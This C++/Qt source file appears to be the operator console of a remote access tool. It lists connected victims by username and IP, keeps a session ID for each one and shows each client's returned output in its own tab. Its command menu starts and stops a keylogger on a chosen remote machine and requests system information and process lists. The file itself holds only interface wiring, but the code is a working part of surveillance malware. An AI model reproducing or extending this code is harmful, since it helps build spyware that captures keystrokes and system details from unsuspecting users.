#include "MainWindow.hpp"

/**
 * @brief Constructs the window, wires button, and pre-maps default tab.
 * @param parent Optional parent widget.
 */
MainWindow::MainWindow(QWidget* parent)
    : QMainWindow(parent)
    , ui(new Ui::MainWindow)
{
    ui->setupUi(this);
    connect(ui->selectionButton, &QPushButton::clicked,
            this, &MainWindow::onSelectionButtonClicked);
    const QString firstLabel = ui->tabWidget->tabText(0);
    clientTabs[firstLabel] = ui->listWidget;
}

/**
 * @brief Destructor cleans up UI.
 */
MainWindow::~MainWindow()
{
    delete ui;
}

/**
 * @brief Handles a newly connected client: updates session and ensures UI presence.
 * @param clientInfo Combined username and IP.
 * @param sessionId Session identifier assigned.
 */
void MainWindow::onClientConnected(const QString& clientInfo, uint32_t sessionId)
{
    m_sessionIds[clientInfo] = sessionId;
    QListWidget* listWidget = ui->clientListWidget;
    for (int i = 0; i < listWidget->count(); ++i) {
        if (listWidget->item(i)->text() == clientInfo) return;
    }
    listWidget->addItem(clientInfo);
    addClientTab(clientInfo);
}

/**
 * @brief Adds a new tab for a client if missing.
 * @param clientId Identifier string for the client.
 */
void MainWindow::addClientTab(const QString& clientId)
{
    if (clientTabs.contains(clientId)) return;
    QWidget* page = new QWidget;
    auto layout = new QVBoxLayout(page);
    layout->setContentsMargins(11, 20, 12, 49);
    QListWidget* outList = new QListWidget;
    layout->addWidget(outList);
    int idx = ui->tabWidget->addTab(page, clientId);
    ui->tabWidget->setCurrentIndex(idx);
    clientTabs[clientId] = outList;
}

/**
 * @brief Clears existing contents and appends new output lines for a client.
 * @param clientId Identifier of the client tab to update.
 * @param text Full text to split and show.
 */
void MainWindow::appendClientOutput(const QString& clientId, const QString& text)
{
    qDebug() << "[GUI] appendClientOutput for" << clientId << "len=" << text.size();
    if (!clientTabs.contains(clientId)) return;
    QListWidget* list = clientTabs[clientId];
    list->clear();
    const QStringList lines = text.split(u'\n', Qt::SkipEmptyParts);
    for (const QString& line : lines) {
        list->addItem(line);
    }
}

/**
 * @brief Handles a response from a client by delegating to output append.
 * @param clientId Identifier of the originating client.
 * @param text Payload text to display.
 */
void MainWindow::onClientResponse(const QString& clientId, const QString& text)
{
    qDebug() << "[GUI] onClientResponse for" << clientId << "text len=" << text.size();
    appendClientOutput(clientId, text);
}

/**
 * @brief Handles user action on selection button, emitting appropriate signals.
 */
void MainWindow::onSelectionButtonClicked()
{
    int idx = ui->comboBox->currentIndex();
    QListWidgetItem* selectedItem = ui->clientListWidget->currentItem();
    if (!selectedItem) {
        QMessageBox::warning(this, "Warning", "Please select a client!");
        return;
    }
    QString clientId = selectedItem->text();
    qDebug() << "[GUI] onSelectionButtonClicked idx=" << idx << "client=" << clientId;
    switch (idx) {
        case 0: emit getInfoSys(clientId); break;
        case 1: emit startKeylogger(clientId); break;
        case 2: emit stopKeylogger(clientId); break;
        case 3: emit requestProcessList(clientId, false); break;
        case 4: emit requestProcessList(clientId, true); break;
        default: break;
    }
}
